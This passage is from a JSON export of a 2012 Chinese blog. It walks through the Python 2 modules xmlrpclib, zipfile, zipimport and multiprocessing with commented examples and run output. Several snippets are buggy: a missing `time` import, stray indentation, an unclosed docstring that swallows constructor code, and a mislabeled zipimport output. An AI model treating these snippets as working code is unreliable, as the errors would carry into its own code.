&lt;/group&gt;\n&lt;/root&gt;\n''')</p>\n\n<p>for key, value in sorted(id_map.items()):\n    print '%s = %s' % (key, value)\n</pre></p>\n\n<p>执行：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nparsed = &lt;Element 'root' at 0xb738fa2c&gt;\ngroup</p>\n\n<p>group</p>\n\n<p>a = &lt;Element 'child' at 0xb738fdcc&gt;\nb = &lt;Element 'child' at 0xb738fcec&gt;\nc = &lt;Element 'child' at 0xb738fe2c&gt;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 216,
    "title": "关于xmlrpclib研究",
    "category": "python模块研究",
    "tags": [
      "xmlrpclib"
    ],
    "url": "/archives/guanyuxmlrpclibyanjiu/",
    "content": "<p>&nbsp;</p>\n\n<p>前言：xmlrpclib是python中用于xmlrpc调用的模块</p>\n\n<p>以下例子的服务器端：</p>\n\n<p><pre class=\"sh_python\">\nfrom SimpleXMLRPCServer import SimpleXMLRPCServer\nfrom xmlrpclib import Binary\nimport cPickle as pickle\nimport datetime</p>\n\n<p>server = SimpleXMLRPCServer(('localhost', 9000), logRequests=True, allow_none=True)\nserver.register_introspection_functions()\nserver.register_multicall_functions()</p>\n\n<p>class ExampleService:</p>\n\n<p>    def ping(self):\n        return True </p>\n\n<p>    def now(self):\n        return datetime.datetime.now()  #返回当前时间</p>\n\n<p>    def show_type(self, arg):\n        return (str(arg), str(type(arg)), arg)</p>\n\n<p>    def raises_exception(self, msg):\n        raise RuntimeError(msg)</p>\n\n<p>    def send_back_binary(self, bin):\n        data = bin.data\n        response = Binary(data)\n        return response</p>\n\n<p>server.register_instance(ExampleService())</p>\n\n<p>try:\n    print 'Use Control-C to exit'\n    server.serve_forever()\nexcept KeyboardInterrupt:\n    print 'Exiting'\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport xmlrpclib\nimport datetime</p>\n\n<p>server = xmlrpclib.ServerProxy('http://localhost:9000', verbose=True) #返回一个连接服务器的实例,verbose=True显示调试信息，否则直接输出结果\n                                                #encoding='gbk':默认的编码是utf－8，这里可以修改成'gbk'。\nprint 'Ping:', server.ping()   #上面定义 返回True  这里就会显示：True\nserver = xmlrpclib.ServerProxy('http://localhost:9000', allow_none=True) #allow_none=True便表示容许把none自动转化成'nil'\nprint 'Allowed:', server.show_type(None)</p>\n\n<p>server = xmlrpclib.ServerProxy('http://localhost:9000', allow_none=False) \nprint 'Not allowed:', server.show_type(None) #触发TypeError\nfor t, v in [ ('boolean', True),   #XML-RPC协议识别有限的常见的数据类型\n              ('integer', 1),\n              ('floating-point number', 2.5),\n              ('string', 'some text'), \n              ('datetime', datetime.datetime.now()),\n              ('array', ['a', 'list']),\n              ('array', ('a', 'tuple')),\n              ('structure', {'a':'dictionary'}),\n            ]:\n    print '%-22s:' % t, server.show_type(v)\nclass MyObj:\n    def __init__(self, a, b):\n        self.a = a\n        self.b = b\n    def __repr__(self):\n        return 'MyObj(%s, %s)' % (repr(self.a), repr(self.b))\no = MyObj(1, 'b goes here')\nprint 'o=', o\nprint server.show_type(o)\no2 = MyObj(2, o)  #传递对象给o2 ，把{'a': 1, 'b': 'b goes here'} 传递给key：b的值\nprint 'o2=', o2\nprint server.show_type(o2)\no = MyObj(1, 'b goes here')\nprint 'Local:', o, id(o) \nprint 'As object:', server.show_type(o) \np = pickle.dumps(o) #数据持久化\nb = xmlrpclib.Binary(p)  #二进制模式传送\nr = server.send_back_binary(b) #返回数据\no2 = pickle.loads(r.data)  #还原持久化\nprint 'From pickle:', o2, id(o2)  #数据相同，但是id不同 因为是不一样的对象\ntry:\n    server.raises_exception('A message')\nexcept Exception, err:\n    print 'Fault code:', err.faultCode  #触发异常的code\n    print 'Message   :', err.faultString #触发异常相应的内容\ns = 'This is a string with control characters' + '\\0' #包含无效的XML字符\nprint 'Local string:', s</p>\n\n<p>data = xmlrpclib.Binary(s) #需要传递二进制数据，最好是使用<tt>二进制</tt>类编码\nprint 'As binary:', server.send_back_binary(data)  #正常打印</p>\n\n<p>print 'As string:', server.show_type(s) #但是xml不识别  触发异常\nmulticall = xmlrpclib.MultiCall(server)  #同时查询某一个连接对象的返回\nmulticall.ping()  #返回：  0：True   前面的数值自增长\nmulticall.show_type(1)\nmulticall.raises_exception('Next to last call stops execution') #这里一个触发，multicall就不再继续了\nmulticall.show_type('string')</p>\n\n<p>for i, r in enumerate(multicall()):\n    print i, r\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 217,
    "title": "关于zipfile研究",
    "category": "python模块研究",
    "tags": [
      "zipfile"
    ],
    "url": "/archives/guanyuzipfileyanjiu/",
    "content": "<p>前言：zipfile是一个读写ZIP档案文件的模块</p>\n\n<p><pre class=\"sh_python\">\nimport zipfile\nimport datetime</p>\n\n<p>for filename in [ 'README.txt', 'example.zip', 'bad_example.zip', 'notthere.zip' ]:\n    print '%20s %s' % (filename, zipfile.is_zipfile(filename))  #返回一个布尔值, 判断给定的文件是否是一个有效的ZIP文件.\nzf = zipfile.ZipFile('example.zip', 'r')  \nprint zf.namelist() #读取现有存档中所有文件的名字  返回一个列表\ndef print_info(archive_name):\n    zf = zipfile.ZipFile(archive_name)\n    for info in zf.infolist(): #访问存档内容的所有元数据\n        print info.filename\n        print '\\tComment:\\t', info.comment  #注释信息\n        print '\\tModified:\\t', datetime.datetime(*info.date_time) #修改时间\n        print '\\tSystem:\\t\\t', info.create_system, '(0 = Windows, 3 = Unix)' #系统  3便是linux\n        print '\\tZIP version:\\t', info.create_version\n        print '\\tCompressed:\\t', info.compress_size, 'bytes' #压缩后的大小\n        print '\\tUncompressed:\\t', info.file_size, 'bytes' #压缩前大小\n        print\nprint_info('example.zip')\nzf = zipfile.ZipFile('example.zip') \nfor filename in [ 'README.txt', 'notthere.txt' ]:\n    try:\n        info = zf.getinfo(filename) #通过文件名获取ZipInfo对象\n    except KeyError:\n        print 'ERROR: Did not find %s in zip file' % filename\n    else:\n        print '%s is %d bytes' % (info.filename, info.file_size)</p>\n\n<p>    try:\n        data = zf.read(filename) #读取访问存档文件的数据，必要时, 数据会自动解压缩.\n    except KeyError:\n        print 'ERROR: Did not find %s in zip file' % filename\n    else:\n        print filename, ':'\n        print repr(data)\n        print\nprint 'creating archive'\nzf = zipfile.ZipFile('zipfile_write.zip', mode='w')  #创建zip存档文件，档案中任何现有文件会被清空, 开始新档案\ntry:\n    print 'adding README.txt'\n    zf.write('README.txt')  #增加文件\nfinally:\n    print 'closing'\n    zf.close()</p>\n\n<p>print\n</pre></p>\n\n<p>执行结果：\ndongwm@linux-dongwm:~&gt; python test.py\nREADME.txt False\nexample.zip True\nbad_example.zip False\nnotthere.zip False\n['README.txt']\nREADME.txt\nComment:\nModified:    2012-06-18 15:40:00\nSystem:        3 (0 = Windows, 3 = Unix)\nZIP version:    20\nCompressed:    9 bytes\nUncompressed:    9 bytes</p>\n\n<p>README.txt is 9 bytes\nREADME.txt :\n'test mes\\n'</p>\n\n<p>ERROR: Did not find notthere.txt in zip file\nERROR: Did not find notthere.txt in zip file\ncreating archive\nadding README.txt\nclosing\n<pre class=\"sh_python\">\nimport zipfile\nimport sys \ntry:\n    import zlib\n    compression = zipfile.ZIP_DEFLATED #zlib模块提供压缩功能. 如果zlib是可用的, 你能使用zipfile.ZIP_DEFLATED对个人文件或者整个档案设置压缩模式.\nexcept:\n    compression = zipfile.ZIP_STORED #默认压缩模式为zipfile.ZIP_STORED.</p>\n\n<p>modes = { zipfile.ZIP_DEFLATED: 'deflated',\n    zipfile.ZIP_STORED: 'stored',\n}</p>\n\n<p>print 'creating archive'\nzf = zipfile.ZipFile('zipfile_write_compression.zip', mode='w')\ntry:\n    print 'adding README.txt with compression mode', modes[compression]\n    zf.write('README.txt', compress_type=compression)\nfinally:\n    print 'closing'\n    zf.close()</p>\n\n<p>print\nzf = zipfile.ZipFile('zipfile_write_arcname.zip', mode='w')\ntry:\n    zf.write('README.txt', arcname='NOT_README.txt') #将一个文件添加到存档中, 但命名不能是原始文件名,而是重命名为'NOT_README.txt'\nfinally:\n    zf.close()\nmsg = 'This data did not exist in a file before being added to the ZIP file'\nzf = zipfile.ZipFile('zipfile_writestr.zip',\n mode='w',\n compression=zipfile.ZIP_DEFLATED,\n)\ntry:\n    zf.writestr('from_string.txt', msg)  #将数据直接写到存档zip的这个文件里\nfinally:\n    zf.close()\nmsg = 'This data did not exist in a file before being added to the ZIP file'\nzf = zipfile.ZipFile('zipfile_writestr_zipinfo.zip', mode='w',)\ntry:\n    info = zipfile.ZipInfo('from_string.txt', date_time=time.localtime(time.time()),) #创建一个ZipInfo实例，修改时间\n    info.compress_type=zipfile.ZIP_DEFLATED #修改压缩方式\n    info.comment='Remarks go here' #添加文件注释\n    info.create_system=0 #修改文件的系统信息 这里变成了windows系统\n    zf.writestr(info, msg) #将数据写道这个ZipInfo实例 也就是把from_string.txt的属性和内容都修改了\nfinally:\n    zf.close()\nzf = zipfile.ZipFile('zipfile_append.zip', mode='a')  #模式'a'是追加模式，追加一个文件或在一个现有文件的末尾增加一个档案文件\ntry:\n    zf.write('README.txt', arcname='README2.txt')\nfinally:\n    zf.close()\nzf = zipfile.PyZipFile('zipfile_pyzipfile.zip', mode='w') #直接将当前目录压缩打包，还能编译py脚本\n    try:\n        zf.debug = 3\n        print 'Adding python files'\n        zf.writepy('.') #PyZipFile浏览目录寻找.py文件, 并且将关联文件 <tt>.pyo</tt> 或 <tt>.pyc</tt> 加入到档案中. 如果两者都不存在, 则生成一个.pyc文件, 并将其加入到档案中.\n    finally:\n        zf.close()\n        for name in zf.namelist():\n            print name</p>\n\n<p>    print\n    sys.path.insert(0, 'zipfile_pyzipfile.zip')\n    import zipfile_pyzipfile\n    print 'Imported from:', zipfile_pyzipfile.__file__\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 218,
    "title": "关于zipimport研究",
    "category": "python模块研究",
    "tags": [
      "zipimport"
    ],
    "url": "/archives/guanyuzipimportyanjiu/",
    "content": "<p>前言：zipimport模块实现如果sys.path中的任何项引用了 ZIP 格式的存档，则 Python 会把该存档视为目录。存档包含一个或多个模块的.py 源文件</p>\n\n<p><pre class=\"sh_python\">\nimport sys\nimport zipfile\nimport zipimport\nimport os</p>\n\n<p>zf = zipfile.PyZipFile('zipimport_example.zip', mode='w')  #创建一个zip\ntry:\n    zf.write('.')  #添加当前目录\n    zf.write('test1.py') #添加这个文件\n    zf.write('txt/README.txt')  #添加这个文件\nfinally:\n    zf.close()\nfor name in zf.namelist():\n    print name #打印zip档案文件\nimporter = zipimport.zipimporter('zipimport_example.zip')  #导入这个zip分析</p>\n\n<p>for module_name in [ 'test1', 'not_there' ]:\n    print module_name, ':', importer.find_module(module_name) #当找到这个模块返回，没有返回none</p>\n\n<p>print importer.get_code('test1') #获取test1.py源码\nmodule = importer.load_module('test1')  #import导入test1.py  \nprint 'Name   :', module.__name__ #模块的名字\nprint 'Loader :', module.__loader__  #返回zipimporter对象\nprint 'Code   :', module.datetime #返回模块的datetime方法(或者类)的引用\nsource = importer.get_source('test1')  #获取test1.py源码\nprint '=' * 80\nprint module_name\nprint '=' * 80\nprint source\nprint\nprint importer.is_package('txt')  #我们把readme.txt 放入了txt  txt就类似于一个包\nimport txt #导入txt这个包 \ndata_filename = os.path.join(os.path.dirname(txt.__file__), \n                             'README.txt')\nprint data_filename, ':'\nprint open(data_filename, 'rt').read()  #读取README.txt内容\n</pre></p>\n\n<p>执行：</p>\n\n<p>dongwm@linux-dongwm:~/test&gt; python test.py\n./\ntest1.py\ntxt/README.txt\ntest1 : &lt;zipimporter object \"zipimport_example.zip\"&gt;\nnot_there : None\n&lt;code object &lt;module&gt; at 0xb73800f8, file \"zipimport_example.zip/test1.py\", line 1&gt;\nName   : test1\nLoader : &lt;zipimporter object \"zipimport_example.zip\"&gt;\nCode   : &lt;module 'datetime' from '/usr/lib/python2.7/lib-dynload/datetime.so'&gt;\n================================================================================\nnot_there\n================================================================================\nfrom SimpleXMLRPCServer import SimpleXMLRPCServer\nfrom xmlrpclib import Binary\nimport datetime</p>\n\n<p>server = SimpleXMLRPCServer(('localhost', 9000), logRequests=True, allow_none=True)\nserver.register_introspection_functions()\nserver.register_multicall_functions()</p>\n\n<p>class ExampleService:</p>\n\n<p>def ping(self):\n\"\"\"Simple function to respond when called to demonstrate connectivity.\"\"\"\nreturn True</p>\n\n<p>def now(self):\n\"\"\"Returns the server current date and time.\"\"\"\nreturn datetime.datetime.now()</p>\n\n<p>def show_type(self, arg):\n\"\"\"Illustrates how types are passed in and out of server methods.</p>\n\n<p>Accepts one argument of any type.\nReturns a tuple with string representation of the value,\nthe name of the type, and the value itself.\n\"\"\"\nreturn (str(arg), str(type(arg)), arg)</p>\n\n<p>def raises_exception(self, msg):\n\"Always raises a RuntimeError with the message passed in\"\nraise RuntimeError(msg)</p>\n\n<p>def send_back_binary(self, bin):\n\"Accepts single Binary argument, unpacks and repacks it to return it\"\ndata = bin.data\nresponse = Binary(data)\nreturn response\n<pre class=\"sh_python\">\nimport sys\nsys.path.insert(0, 'zipimport_example.zip')\nprint txt.__file__\nprint txt.__loader__.get_data('txt/README.txt')  #导入模块使用get_data获取数据，而不能只是 open(os.path.join(os.path.dirname(txt.__file__), 'README.txt'), 'rt').read()\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 219,
    "title": "关于multiprocessing研究(二)",
    "category": "python模块研究",
    "tags": [
      "multiprocessing"
    ],
    "url": "/archives/guanyumultiprocessingyanjiuer/",
    "content": "<p><pre class=\"sh_python\">\nimport multiprocessing</p>\n\n<p>class MyFancyClass(object):</p>\n\n<p>    def __init__(self, name):\n        self.name = name</p>\n\n<p>    def do_something(self):\n        proc_name = multiprocessing.current_process().name\n        print 'Doing something fancy in %s for %s!' % (proc_name, self.name)</p>\n\n<p>def worker(q):\n    obj = q.get()   #获取队列\n    obj.do_something()</p>\n\n<p>if __name__ == '__main__':\n    queue = multiprocessing.Queue() #Queue基本属于Queue.Queue模块的复制,他主要用来做进程间的通信</p>\n\n<p>    p = multiprocessing.Process(target=worker, args=(queue,))\n    p.start()</p>\n\n<p>    queue.put(MyFancyClass('Fancy Dan'))</p>\n\n<p>    queue.close()\n    queue.join_thread()  #\n    p.join()   #阻塞直到queue中的所有的task都被处理（即task_done方法被调用）\n</pre></p>\n\n<p>注：Queue建构在系统的Pipe之上，但是实际上进程并不是直接将对象写入到Pipe里面，而是先写入一个本地的buffer，</p>\n\n<p>再由一个专门 的feed线程将其放入Pipe当中。读取端则是直接从Pipe当中读出对象。之所以有这样一个feed线程，</p>\n\n<p>是为了能够提供Queue接口函数所需要的 put的超时控制。但是由于这个feed线程的存在，mp.Queue提供了几个额外的函数来控制它，</p>\n\n<p>一个函数close来停止该线程，以及 join_thread来join该线程。close同时负责把所有在buffer当中的对象刷新到Pipe当中</p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport time</p>\n\n<p>class Consumer(multiprocessing.Process):</p>\n\n<p>    def __init__(self, task_queue, result_queue):\n        multiprocessing.Process.__init__(self)\n        self.task_queue = task_queue\n        self.result_queue = result_queue</p>\n\n<p>    def run(self):\n        proc_name = self.name\n        while True:\n            next_task = self.task_queue.get()  #获取队列\n            if next_task is None:\n                print '%s: Exiting' % proc_name\n                self.task_queue.task_done()  #向任务已经完成的队列发送一个信号\n                break\n            print '%s: %s' % (proc_name, next_task)\n            answer = next_task() #执行队列的那个类\n            self.task_queue.task_done()\n            self.result_queue.put(answer)\n        return</p>\n\n<p>class Task(object):\n    def __init__(self, a, b):\n        self.a = a\n        self.b = b\n    def __call__(self):\n        time.sleep(0.1) # 保证这部分正常执行\n        return '%s * %s = %s' % (self.a, self.b, self.a * self.b)\n    def __str__(self):\n        return '%s * %s' % (self.a, self.b)  #元类计算结果</p>\n\n<p>if __name__ == '__main__':\n    tasks = multiprocessing.JoinableQueue()  #JoinableQueue 是 Queue的子类，增加了task_done()和join()方法\n    results = multiprocessing.Queue()</p>\n\n<p>    num_consumers = multiprocessing.cpu_count() * 2  #创建消费者，cpu个数的2倍\n    print 'Creating %d consumers' % num_consumers  \n    consumers = [ Consumer(tasks, results)\n                  for i in xrange(num_consumers) ]\n    for w in consumers:\n        w.start()</p>\n\n<p>    num_jobs = 10\n    for i in xrange(num_jobs):\n        tasks.put(Task(i, i))  #创建10个job</p>\n\n<p>    for i in xrange(num_consumers):  #为每个消费者添加队列结束标记\n        tasks.put(None)\n    tasks.join()  #等待所有tasks完成</p>\n\n<p>    while num_jobs:\n        result = results.get()\n        print 'Result:', result  #打印结果\n        num_jobs -= 1\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport time</p>\n\n<p>def wait_for_event(e):\n    print 'wait_for_event: starting'\n    e.wait()   #<span>主线程将被阻塞，它将不会 再被分配时间片 直到现有的一些线程退出运行</span>\n    print 'wait_for_event: e.is_set()-&gt;', e.is_set()  #返回事件是否设置的布尔值</p>\n\n<p>def wait_for_event_timeout(e, t):\n    print 'wait_for_event_timeout: starting'\n    e.wait(t)  #设置等待超时\n    print 'wait_for_event_timeout: e.is_set()-&gt;', e.is_set()</p>\n\n<p>if __name__ == '__main__':\n    e = multiprocessing.Event()  #类似<tt>threading.Event</tt>,替代time.sleep(),用wait()和set()来精确控制线程\n    w1 = multiprocessing.Process(name='block', \n                                 target=wait_for_event,\n                                 args=(e,))\n    w1.start()</p>\n\n<p>    w2 = multiprocessing.Process(name='non-block', \n                                 target=wait_for_event_timeout, \n                                 args=(e, 2))\n    w2.start()</p>\n\n<p>    print 'main: waiting before calling Event.set()'\n    time.sleep(3)\n    e.set()\n    print 'main: event is set'\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nmain: waiting before calling Event.set()\nwait_for_event: starting\nwait_for_event_timeout: starting\nwait_for_event_timeout: e.is_set()-&gt; False\nmain: event is set\nwait_for_event: e.is_set()-&gt; True\n<pre class=\"sh_python\">\nimport multiprocessing\nimport sys</p>\n\n<p>def worker_with(lock, stream):\n    with lock:\n        stream.write('Lock acquired via with\\n') #lock资源</p>\n\n<p>def worker_no_with(lock, stream):\n    lock.acquire() #获得资源\n    try:\n        stream.write('Lock acquired directly\\n')\n    finally:\n        lock.release()  #释放资源</p>\n\n<p>lock = multiprocessing.Lock() #需要多个进程之间共享一个单一的资源的情况下，可以使用Lock，以避免冲突的访问\nw = multiprocessing.Process(target=worker_with, args=(lock, sys.stdout))\nnw = multiprocessing.Process(target=worker_no_with, args=(lock, sys.stdout))</p>\n\n<p>w.start()\nnw.start()</p>\n\n<p>w.join()\nnw.join()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport time</p>\n\n<p>def stage_1(cond):  #执行工作的第一阶段，然后通知继续阶段2”\n    name = multiprocessing.current_process().name\n    print 'Starting', name\n    with cond:\n        print '%s done and ready for stage 2' % name\n        cond.notify_all()   #唤醒所有挂起的线程（如果存在挂起的线程），但是这些方法不会释放所占用的琐</p>\n\n<p>def stage_2(cond):  #告诉我们阶段1完成的情况下等待\n    name = multiprocessing.current_process().name\n    print 'Starting', name\n    with cond:\n        cond.wait()  #释放内部所占用的琐，同时线程被挂起，直至接收到通知被唤醒或超时（如果提供了timeout参数的话）。\n                     #当线程被唤醒并重新占有琐的时候，程序才会继续执行下去。\n        print '%s running' % name</p>\n\n<p>if __name__ == '__main__':\n    condition = multiprocessing.Condition() #它提供了比Lock, RLock更高级的功能，允许我们能够控制复杂的线程同步问题\n    s1 = multiprocessing.Process(name='s1', target=stage_1, args=(condition,))\n    s2_clients = [\n        multiprocessing.Process(name='stage_2[%d]' % i, target=stage_2, args=(condition,))\n        for i in range(1, 3)\n        ]</p>\n\n<p>    for c in s2_clients:\n        c.start()\n        time.sleep(1)\n    s1.start()</p>\n\n<p>    s1.join()\n    for c in s2_clients:\n        c.join()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nStarting stage_2[1]\nStarting stage_2[2]\nStarting s1\ns1 done and ready for stage 2\nstage_2[2] running\nstage_2[1] running\n<pre class=\"sh_python\">\nimport random\nimport multiprocessing\nimport time</p>\n\n<p>class ActivePool(object):   #跟踪进程执行状态\n    def __init__(self):\n        super(ActivePool, self).__init__()  #保证公共父类仅被执行一次\n        self.mgr = multiprocessing.Manager()  #进程间共享数据,支持的类型有list,dict,Namespace,Lock,RLock,Semaphore,BoundedSemaphore,Condition,Event,Queue,Value和Array\n        self.active = self.mgr.list()\n        self.lock = multiprocessing.Lock()\n    def makeActive(self, name):\n        with self.lock:\n            self.active.append(name)\n    def makeInactive(self, name):\n        with self.lock:\n            self.active.remove(name)\n    def __str__(self):\n        with self.lock:\n            return str(self.active)</p>\n\n<p>def worker(s, pool):\n    name = multiprocessing.current_process().name\n    with s:\n        pool.makeActive(name)\n        print 'Now running: %s' % str(pool)\n        time.sleep(random.random())\n        pool.makeInactive(name)</p>\n\n<p>if __name__ == '__main__':\n    pool = ActivePool()\n    s = multiprocessing.Semaphore(3) #Semaphore用来控制对共享资源的访问数量，例如池的最大连接数，这里只有三个活动进程同时运行\n    jobs = [\n        multiprocessing.Process(target=worker, name=str(i), args=(s, pool))\n        for i in range(10)\n        ]</p>\n\n<p>    for j in jobs:\n        j.start()</p>\n\n<p>    for j in jobs:\n        j.join()\n        print 'Now running: %s' % str(pool)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing</p>\n\n<p>def producer(ns, event):\n    ns.value = 'This is the value'\n    event.set()</p>\n\n<p>def consumer(ns, event):\n    try:\n        value = ns.value\n    except Exception, err:\n        print 'Before event, consumer got:', str(err)\n    event.wait()\n    print 'After event, consumer got:', ns.value</p>\n\n<p>if __name__ == '__main__':\n    mgr = multiprocessing.Manager()\n    namespace = mgr.Namespace()  #通过Manager管理共享命名空间\n    event = multiprocessing.Event()\n    p = multiprocessing.Process(target=producer, args=(namespace, event))\n    c = multiprocessing.Process(target=consumer, args=(namespace, event))</p>\n\n<p>    c.start()\n    p.start()</p>\n\n<p>    c.join()\n    p.join()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nBefore event, consumer got: 'Namespace' object has no attribute 'value'\nAfter event, consumer got: This is the value\n<pre class=\"sh_python\">\nimport multiprocessing</p>\n\n<p>def producer(ns, event):\n    ns.my_list.append('This is the value') # DOES NOT UPDATE GLOBAL VALUE!\n    event.set()</p>\n\n<p>def consumer(ns, event):\n    print 'Before event, consumer got:', ns.my_list\n    event.wait()\n    print 'After event, consumer got:', ns.my_list</p>\n\n<p>if __name__ == '__main__':\n    mgr = multiprocessing.Manager()\n    namespace = mgr.Namespace()\n    namespace.my_list = []</p>\n\n<p>    event = multiprocessing.Event()  \n    p = multiprocessing.Process(target=producer, args=(namespace, event))\n    c = multiprocessing.Process(target=consumer, args=(namespace, event))</p>\n\n<p>    c.start()\n    p.start()</p>\n\n<p>    c.join()\n    p.join()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nBefore event, consumer got: []\nAfter event, consumer got: []\n注意：其中程序的producer已经设置了一个列表值,可变值中的命名空间的内容<em>更新不</em>自动传播。所以consumer事件更新后还是空列表</p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing</p>\n\n<p>def do_calculation(data):\n    return data * 2</p>\n\n<p>def start_process():\n    print 'Starting', multiprocessing.current_process().name</p>\n\n<p>if __name__ == '__main__':\n    inputs = list(range(10))\n    print 'Input   :', inputs</p>\n\n<p>    builtin_outputs = map(do_calculation, inputs)  #返回一个隐射，lambda x:x*2\n    print 'Built-in:', builtin_outputs</p>\n\n<p>    pool_size = multiprocessing.cpu_count() * 2\n    pool = multiprocessing.Pool(processes=pool_size, #进程池管理固定数量的进程，还能设定一个maxtasksperchild（从添加python2.7），任务可以完成之前\n                                initializer=start_process,  #它会退出和更换一个新的工作进程，使闲置的资源被释放。\n                                )\n    pool_outputs = pool.map(do_calculation, inputs)  #   map方法与内置的map函数行为基本一致，在它会使进程阻塞与此直到结果返回。\n    pool.close()  #关闭pool，使其不在接受新的任务。\n    pool.join()  #结束当前任务,主进程阻塞等待子进程的退出， join方法要在close或terminate之后使用。</p>\n\n<p>    print 'Pool    :', pool_outputs\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nInput   : [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nBuilt-in: [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\nStarting PoolWorker-1\nStarting PoolWorker-2\nStarting PoolWorker-3\nStarting PoolWorker-4\nStarting PoolWorker-5\nStarting PoolWorker-6\nStarting PoolWorker-7\nStarting PoolWorker-8\nPool    : [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n<pre class=\"sh_python\">\nimport multiprocessing \nimport string\nimport collections\nimport itertools\nimport multiprocessing</p>\n\n<p>class SimpleMapReduce(object):</p>\n\n<p>    def __init__(self, map_func, reduce_func, num_workers=None): \n        \"\"\"\n        map_func是一个用实现映射（对一些独立元素组成的概念上的列表（例如，一个测试成绩的列表）的每一个元素进行指定的操作（\n        有人发现所有学生的成绩都被高估了一分，他可以定义一个“减一”的映射函数，用来修正这个错误。）。事实上，每个元素都是被独立操作的，\n        而原始列表没有被更改，因为这里创建了一个新的列表来保存新的答案）的函数</p>\n\n<p>        reduce_func是一个用于化简（对一个列表的元素进行适当的合并（如果有人想知道班级的平均分该怎么做？他可以定义一个化简函数，\n        通过让列表中的元素跟自己的相邻的元素相加的方式把列表减半，如此递归运算直到列表只剩下一个元素，然后用这个元素除以人数，\n        就得到了平均分。）。虽然他不如映射函数那么并行，但是因为化简 总是有一个简单的答案，大规模的运算相对独立）的函数\n        num_workers是进程池的数量这里默认就是cpu数目\n        self.map_func = map_func\n        self.reduce_func = reduce_func\n        self.pool = multiprocessing.Pool(num_workers)</p>\n\n<p>    def partition(self, mapped_values):  #组织k-v映射，返回一个键和一个值序列元组的无序序列\n        partitioned_data = collections.defaultdict(list)\n        for key, value in mapped_values:\n            partitioned_data[key].append(value)\n        return partitioned_data.items()</p>\n\n<p>    def __call__(self, inputs, chunksize=1):  #inputs是一个包含输入的数据进行处理的迭代器 chunksize用来调整映射效果\n        map_responses = self.pool.map(self.map_func, inputs, chunksize=chunksize)\n        partitioned_data = self.partition(itertools.chain(*map_responses))\n        reduced_values = self.pool.map(self.reduce_func, partitioned_data)\n        return reduced_values\ndef file_to_words(filename):  \n    STOP_WORDS = set([\n            'a', 'an', 'and', 'are', 'as', 'be', 'by', 'for', 'if', 'in', \n            'is', 'it', 'of', 'or', 'py', 'rst', 'that', 'the', 'to', 'with',\n            ])\n    TR = string.maketrans(string.punctuation, ' ' * len(string.punctuation))</p>\n\n<p>    print multiprocessing.current_process().name, 'reading', filename\n    output = []</p>\n\n<p>    with open(filename, 'rt') as f:\n        for line in f:\n            if line.lstrip().startswith('..'): # Skip rst comment lines\n                continue\n            line = line.translate(TR) # Strip punctuation\n            for word in line.split():\n                word = word.lower()\n                if word.isalpha() and word not in STOP_WORDS:\n                    output.append( (word, 1) )\n    return output   #读取文件并返回一个值（词，字符串）序列</p>\n\n<p>def count_words(item):\n    word, occurances = item\n    return (word, sum(occurances))  #转换成包含单词和其数量的元组</p>\n\n<p>if __name__ == '__main__':\n    import operator\n    import glob</p>\n\n<p>    input_files = glob.glob('*.rst')</p>\n\n<p>    mapper = SimpleMapReduce(file_to_words, count_words)\n    word_counts = mapper(input_files)\n    word_counts.sort(key=operator.itemgetter(1))\n    word_counts.reverse()</p>\n\n<p>    print '\\nTOP 20 WORDS BY FREQUENCY\\n'\n    top20 = word_counts[:20]\n    longest = max(len(word) for word, count in top20)\n    for word, count in top20:\n        print '%-*s: %5s' % (longest+1, word, count)\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "05"
    }
  },
  {
    "id": 220,
    "title": "关于multiprocessing研究(一)",
    "category": "python模块研究",
    "tags": [
      "multiprocessing"
    ],
    "url": "/archives/guanyumultiprocessingyanjiuyi/",
    "content": "<p>前言：multiprocessing是一个使用方法类似threading模块的进程模块，允许程序员做并行开发，从python2.6开始内置</p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport logging,sys\ndef worker():\n    print 'Worker'\n    sys.stdout.flush() \n    return</p>\n\n<p>if __name__ == '__main__':\n    jobs = []\n    for i in range(5):\n        multiprocessing.log_to_stderr(logging.DEBUG)  #记录日志,也可以使用一下注释的三句\n        #multiprocessing.log_to_stderr() \n        #logger = multiprocessing.get_logger() \n        #logger.setLevel(logging.INFO)\n        p = multiprocessing.Process(target=worker)  #实例化Process\n        jobs.append(p)\n        p.start() #调用start()开始，类似于threading.Thread\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing</p>\n\n<p>def worker(num): #带参数的函数\n    print 'Worker:', num\n    return</p>\n\n<p>if __name__ == '__main__':\n    jobs = []\n    for i in range(5):\n        p = multiprocessing.Process(target=worker, args=(i,)) #带参数的目标\n        jobs.append(p)\n        p.start()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport multiprocessing\nimport time</p>\n\n<p>def worker():\n    name = multiprocessing.current_process().name  #当前进程名字\n    print name, 'Starting'\n    time.sleep(2)\n    print name, 'Exiting'</p>\n\n<p>def my_service():\n    name = 